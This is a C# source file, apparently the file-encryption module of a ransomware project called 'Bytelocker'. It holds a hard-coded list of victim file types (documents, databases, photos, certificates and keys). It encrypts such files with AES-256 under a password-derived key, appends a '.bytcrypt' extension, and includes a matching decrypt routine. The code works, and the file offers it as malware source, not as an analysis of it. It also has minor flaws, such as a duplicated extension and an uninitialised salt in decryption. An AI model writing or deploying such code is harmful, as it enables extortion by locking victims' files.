using System;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace Bytelocker.CryptoManager
{
    class FileEncrypter : PasswordManager
    {
        private String file_path;
        private byte[] salt;

        public static String FILE_EXTENSION_ENCRYPT = ".bytcrypt";
        public static List<String> FILE_EXTENSIONS_TO_ENCRYPT = new List<string>(){".odt", ".ods", ".odp", ".odm", ".odc", ".odb", ".doc", ".docx", ".docm", ".wps", ".xls", ".xlsx", ".xlsm",
            ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm", ".mdb", ".accdb", ".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".rtf", ".wb2", ".mdf", ".dbf", ".psd", ".pdd", ".pdf", ".eps", ".ai", ".indd",
            ".cdr", ".jpg", ".jpe", ".jpg", ".dng", ".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2", ".dcr", ".kdc", ".erf", ".mef", ".mrw", ".nef", ".nrw", ".orf", ".raf", ".raw", ".rwl",
            ".rw2", ".r3d", ".ptx", ".pef", ".srw", ".x3f", ".der", ".cer", ".crt", ".pem", ".pfx", ".p12", ".p7b", ".p7c"};


        private const int AES_KEYSIZE = 256;
        private const int WRITE_BUFFER = 1048576;
        private const int AES_BLOCK_SIZE = 128;
        private const PaddingMode AES_PADDING_MODE = PaddingMode.PKCS7;
        private const CipherMode CIPHER_MODE = CipherMode.CFB;

        public void ChooseFile(String file_path)
        {
            this.file_path = file_path;
        }

        public void GenerateRandomSalt()
        {
            Aes objAES = new Aes();
            this.salt = objAES.GenerateRandomSalt();
        }

        public void Encrypt()
        {
            
            // create encrypted file name
            FileStream fs = new FileStream(this.file_path + FILE_EXTENSION_ENCRYPT, FileMode.Create);

            // use Rijndael encryption algor.
            RijndaelManaged rm = new RijndaelManaged();
            rm.KeySize = AES_KEYSIZE;
            rm.BlockSize = AES_BLOCK_SIZE;
            rm.Padding = AES_PADDING_MODE;

            var key = new Rfc2898DeriveBytes(System.Text.Encoding.UTF8.GetBytes(this.password), this.salt, 50000);
            rm.Key = key.GetBytes(rm.KeySize / 8);
            rm.IV = key.GetBytes(rm.BlockSize / 8);

            rm.Mode = CIPHER_MODE;

            fs.Write(this.salt, 0, this.salt.Length);

            CryptoStream cs = new CryptoStream(fs, rm.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(this.file_path, FileMode.Open);

            byte[] buffer = new byte[WRITE_BUFFER];
            int count;

            // write new file
            try
            {
                while ((count = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, count);
                }

                fsIn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fs.Close();
            }

        }

        public void Decrypt()
        {
            FileStream fs = new FileStream(this.file_path, FileMode.Open);
            fs.Read(this.salt, 0, this.salt.Length);

            RijndaelManaged rm = new RijndaelManaged();
            rm.KeySize = AES_KEYSIZE;
            rm.BlockSize = AES_BLOCK_SIZE;
            var key = new Rfc2898DeriveBytes(System.Text.Encoding.UTF8.GetBytes(password), this.salt, 50000);
            rm.Key = key.GetBytes(rm.KeySize / 8);
            rm.IV = key.GetBytes(rm.BlockSize / 8);
            rm.Padding = AES_PADDING_MODE;
            rm.Mode = CIPHER_MODE;

            CryptoStream cs = new CryptoStream(fs, rm.CreateDecryptor(), CryptoStreamMode.Read);
            FileStream fsOut = new FileStream(this.file_path.Substring(0, this.file_path.Length - FILE_EXTENSION_ENCRYPT.Length), FileMode.Create);

            byte[] buffer = new byte[WRITE_BUFFER];
            int count;

            try
            {
                while ((count = cs.Read(buffer, 0, buffer.Length)) > 0)
                {
                    fsOut.Write(buffer, 0, count);
                }

                cs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            } finally
            {
                fsOut.Close();
                fs.Close();
            }
        }

    }
}